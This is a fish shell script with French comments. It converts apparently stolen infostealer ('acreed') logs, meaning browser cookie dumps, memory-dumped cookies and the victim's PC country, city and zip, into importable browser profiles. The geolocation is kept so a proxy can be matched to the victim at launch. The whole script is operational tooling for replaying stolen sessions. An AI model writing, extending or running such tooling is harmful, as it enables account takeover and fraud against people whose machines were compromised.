#!/usr/bin/env fish
#
# adapter.fish <src> <dest> — log acreed → profils cyborg.
#
# <src>  : un dossier de log acreed (ex /tmp/LOGID-34349921/) contenant
#          Cookies/<Browser>_<n>[_Memory].txt  (cookies Netscape) et pc_info.json.
# <dest> : dossier PARENT ; un sous-profil cyborg par groupe browser+index
#          (dest/Chrome_0/, dest/Chrome_1/, dest/Edge_0/, …). Chrome_0.txt et
#          Chrome_0_Memory.txt fusionnent dans dest/Chrome_0/.
#
# Chaque sous-profil produit :
#   state.tar.xz       cookies.json (Netscape → network.Cookie, format set-profile)
#   device_country     pc_info.Country (seed ; réécrit par la géoloc proxy au launch)
#   device_language    'en' (seed neutre ; idem)
#   expected-geo.json  {country, city, zip} — géo de RÉFÉRENCE immuable, comparée
#                      à la géoloc proxy au lancement (warning). Nom générique :
#                      la spec du profil n'a pas à connaître « acreed ».
#
# Pas de proxy ni de mot de passe (absents du log / non transportables).

set -lx log_registry CybAcreedAdapter

argparse -N2 -X2 -- $argv; or exit (llerr -e2 "usage: adapter.fish <src> <dest>")
set -l src (path resolve -- $argv[1])
set -l dest (path resolve -- $argv[2])

test -d $src/Cookies
or exit (llerr -e2 "src incompatible")

rmdir $dest 2>/dev/null
mkdir $dest; or exit (llerr -e2 "dest existe déjà")

# ── Un profil cyborg par groupe ──────────────────────────────────────────────
for cookie_path in $src/Cookies/*.txt
    set -l profile_id (path basename -- $cookie_path | string match -rg '^([A-Za-z]+_\d+)\.txt$')
    or continue

    set -l dest_profile $dest/$profile_id
    rmdir $dest_profile 2>/dev/null
    mkdir $dest_profile; or continue (llwar "profile déjà existant : $(llcode $dest_profile)")

    # base d'abord, _Memory ensuite : sur conflit (domain|path|name) le plus frais
    # (_Memory, dump mémoire) gagne à la dédup.
    set -l cookies_paths (path filter -- \
        $src/Cookies/$profile_id.txt $src/Cookies/$profile_id"_Memory.txt")

    # Netscape → [network.Cookie] : champs obligatoires de Cookie.from_json inclus
    # (size, session, priority, sourceScheme, sourcePort). #HttpOnly_ → http_only.
    # tr -d '\r' : logs Windows (CRLF) → sinon un \r se colle à la valeur.
    # rg '^([^#]|#HttpOnly_)' : garde les lignes de données ET #HttpOnly_, jette les
    # vides et les vrais commentaires (# Netscape…), sans lookahead.
    # ltrimstr("﻿") : BOM UTF-8 en tête de fichier — sinon collé au domaine du 1er
    # cookie (﻿.df-srv.de) → Chrome rejette « Invalid cookie fields ». Mi-flux entre
    # fichiers concaténés, donc traité par ligne côté jq (rg ne strippe que le début).
    cat $cookies_paths | tr -d '\r' | rg '^([^#]|#HttpOnly_)' | jq -Rn '[ inputs
        | ltrimstr("﻿")
        | (startswith("#HttpOnly_")) as $ho
        | (if $ho then .[10:] else . end)
        | split("\t") | select(length >= 7)
        | (.[4] | tonumber? // 0) as $exp
        | { name:.[5], value:.[6], domain:.[0], path:.[2],
            size:((.[5]|length) + (.[6]|length)),
            httpOnly:$ho, secure:(.[3]|ascii_upcase == "TRUE"),
            session:($exp == 0), priority:"Medium",
            sourceScheme:"Unset", sourcePort:-1 }
        | if .session then . else . + {expires:$exp} end
      ] | reduce .[] as $c ({}; .["\($c.domain)|\($c.path)|\($c.name)"] = $c) | [.[]]' \
        >$dest_profile/cookies.json
    or continue (llwar "Conversion raté de $(llcode $profile_id)")

    # Info PC. L'IP est déjà localisé
    jq -r '.Country // ""' <$src/pc_info.json >$dest_profile/app_country.txt
    jq -r '.City // ""' <$src/pc_info.json >$dest_profile/app_city.txt
    jq -r '.ZipCode // ""' <$src/pc_info.json >$dest_profile/app_postalcode.txt

    tar -cJf $dest_profile/state.tar.xz -C $dest_profile cookies.json

    set -l cookie_count (jq length <$dest_profile/cookies.json)
    llinf "$profile_id → $(llcode $dest_profile) [$(llcode $country)] : $cookie_count cookies"
end

llinf "profils écrits dans $(llcode $dest)"
